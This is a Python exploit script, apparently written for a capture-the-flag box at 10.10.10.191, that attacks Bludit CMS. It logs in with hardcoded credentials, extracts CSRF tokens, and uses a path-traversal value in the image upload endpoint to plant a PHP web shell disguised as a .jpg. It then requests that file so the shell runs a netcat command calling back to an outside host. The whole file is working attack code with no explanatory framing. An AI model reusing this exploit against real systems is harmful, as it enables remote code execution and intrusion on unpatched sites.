import requests
import re
import argparse
import string
import random

def login(user,password,url):
	session = requests.Session()
	login_page = session.get(url+'/admin/')
	print(url+'/admin/')
	csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"',login_page.text).group(1)
	print(csrf_token)
	cookie = ((login_page.headers['Set-Cookie']).split(';')[0].split('=')[1])
	print('cookie:'+cookie)
	paramsPost = {"save":"","password":password,"tokenCSRF":csrf_token,"username":user}
	headers = {\
				"Origin":url,\
				"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",\
				"Upgrade-Insecure-Requests":"1",\
				"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",\
				"Connection":"close",\
				"Referer":"http://10.10.10.191/admin/",\
				"Accept-Language":"en-US,en;q=0.5",\
				"Accept-Encoding":"gzip, deflate",\
				"Content-Type":"application/x-www-form-urlencoded",\
				"Content-Length":"86",\
				#"Cookie":"BLUDIT-KEY="+cookie+"",\
				}
	#User agent running on linux messes up the whole request for some reason.
	#Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
	cookies = {"BLUDIT-KEY":cookie}
	response = session.post(url + "/admin/", data=paramsPost, headers=headers,cookies=cookies, allow_redirects=False)	
	return cookie

def retrieve_dashboard(cookie,url):
	session = requests.Session()
	print('cookie:'+cookie)
	headers = {\
				"Origin":url,\
				"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",\
				"Upgrade-Insecure-Requests":"1",\
				"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",\
				"Connection":"close","Referer":url + "/admin/","Accept-Language":"es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",\
				"Accept-Encoding":"gzip, deflate",\
				}
	cookies = {"BLUDIT-KEY":cookie}
	dashboard = session.get(url + "/admin/dashboard",headers=headers,cookies=cookies)
	#print(dashboard.text)
	csrf_token = dashboard.text.split('var tokenCSRF = "')[1].split('"')[0]
	print('token: '+csrf_token)
	return csrf_token

def upload_shell(url,cookie,csrf_token,shell,command):
	session = requests.Session()
	'''
	headers = {\
				"Origin":url,\
				"Accept":"*/*",\
				"Upgrade-Insecure-Requests":"1",\
				"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",\
				"Connection":"close",\
				"Referer":"http://10.10.10.191/admin/new-content",\
				"Accept-Language":"en-US,en;q=0.5",\
				"Accept-Encoding":"gzip, deflate",\
				"X-Requested-With": "XMLHttpRequest",\
				"Content-Type":"multipart/form-data; boundary=---------------------------5610341844574775481039696468",\
				"Content-Length":"1105113",\
				#"Cookie":"BLUDIT-KEY="+cookie+"",\
				}
	'''
	headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0","Connection":"close","Accept-Language":"es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3","Accept-Encoding":"gzip, deflate"}
	paramsPost = {"uuid":"../../tmp","tokenCSRF":csrf_token}
	#paramsContent = {'images[]':None , ''}
	#paramsMultipart = [('images[]', (shell, "<?php shell_exec(\"rm .htaccess ; rm " + shell + " ;" + command + "\");?>", 'application/octet-stream'))]
	paramsMultipart = [('images[]', (shell, "<?php shell_exec(\"rm .htaccess ;" + command + "\");?>", 'application/octet-stream'))]
	cookies = {"BLUDIT-KEY":cookie}
	response = session.post(url+'/admin/ajax/upload-images', headers=headers, cookies=cookies,data=paramsPost,files=paramsMultipart)
	print(response.text)


def trigger(url,shell,command):
	session = requests.Session()
	headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0","Connection":"close","Accept-Language":"es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3","Accept-Encoding":"gzip, deflate"}
	try:
		response = session.get(url + "/bl-content/tmp/" + shell , headers=headers, timeout=1)
		print(url+"/bl-content/tmp/"+shell)
		print('Request sent')
		print(response.text)
	except requests.exceptions.ReadTimeout:
		print('Failed')
		pass
	print('Done')

def main():
	url = 'http://10.10.10.191'
	user = 'fergus'
	password = 'RolandDeschain'
	cookie = login(user,password,url)
	letters = string.ascii_lowercase
	shell = ''.join(random.choice(letters) for i in range(10))+'.jpg'
	csrf_token = retrieve_dashboard(cookie,url)
	command = 'nc 10.10.15.176 1234'
	upload_shell(url,cookie,csrf_token,shell,command)
	trigger(url,shell,command)

if __name__ == '__main__':
	main()